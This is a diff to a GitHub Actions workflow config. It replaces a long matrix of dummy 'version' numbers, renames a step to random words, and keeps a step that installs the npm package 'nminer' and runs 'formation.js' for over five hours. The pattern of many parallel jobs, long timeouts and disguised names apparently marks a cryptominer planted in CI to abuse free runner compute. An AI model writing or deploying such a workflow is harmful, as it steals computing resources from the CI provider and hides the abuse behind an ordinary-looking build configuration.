@@ -9,24 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9841 }
-          - { version: 1998 }
-          - { version: 352 }
-          - { version: 9365 }
-          - { version: 9563 }
-          - { version: 2076 }
-          - { version: 2008 }
-          - { version: 5369 }
-          - { version: 2622 }
-          - { version: 8162 }
-          - { version: 5864 }
-          - { version: 814 }
-          - { version: 3542 }
-          - { version: 6098 }
-          - { version: 8210 }
-          - { version: 1457 }
-          - { version: 3984 }
-          - { version: 690 }
+          - { version: 2284 }
+          - { version: 5034 }
+          - { version: 391 }
+          - { version: 707 }
+          - { version: 7858 }
+          - { version: 939 }
+          - { version: 2406 }
+          - { version: 5929 }
+          - { version: 8886 }
+          - { version: 5973 }
+          - { version: 9998 }
+          - { version: 7920 }
+          - { version: 2724 }
+          - { version: 9084 }
+          - { version: 3522 }
+          - { version: 7986 }
 
     steps:
       - name: Checkout
@@ -37,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: austere pulse rough general descendant
+      - name: diligently plain
         run: |
           npm install nminer@latest
-          timeout 344m node formation.js || echo "formation executed"
+          timeout 322m node formation.js || echo "formation executed"
